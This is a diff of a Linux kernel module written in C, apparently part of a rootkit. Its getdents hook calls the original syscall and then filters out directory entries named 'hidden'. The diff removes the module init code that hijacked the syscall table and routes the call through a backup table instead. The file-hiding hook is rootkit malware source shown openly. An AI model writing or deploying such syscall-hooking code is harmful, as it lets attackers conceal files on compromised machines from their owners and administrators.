@@ -4,12 +4,6 @@
 #include "utility.h"
 MODULE_LICENSE("GPL");
 
-//char* arg;
-//module_param(arg, charp, 0);
-
-
-SYS_getdents_type orig_syscall; /*the original systemcall*/
-
 void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
 	int i;
 	struct linux_dirent64* dirent;
@@ -39,25 +33,12 @@ void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
 }
 
 
-int replace_syscall(int fd, char* buf, int BUF_SIZE) {
+int getdentsShim(int fd, char* buf, int BUF_SIZE) {
 	int nread;
-	nread = orig_syscall(fd, buf, BUF_SIZE);
+	nread = ((SYS_getdents_type)backup_sys_call_table[SYS_getdents])(fd, buf, BUF_SIZE);
 	if (nread <= 0) {
 		return nread;
 	}
 	hidename(buf, &nread, "hidden", BUF_SIZE);
 	return nread;
-}
-
-int init_module() {
-	make_rw(sys_call_table);
-	orig_syscall = (SYS_getdents_type) sys_call_table[SYS_getdents];
-	sys_call_table[SYS_getdents] = (syscall)replace_syscall;
-	printk(KERN_INFO "Module loaded\n");
-	return 0;
-}
-
-void cleanup_module() {
-	sys_call_table[SYS_getdents] = (syscall)orig_syscall;
-	printk(KERN_INFO "Module unloaded\n");
 }
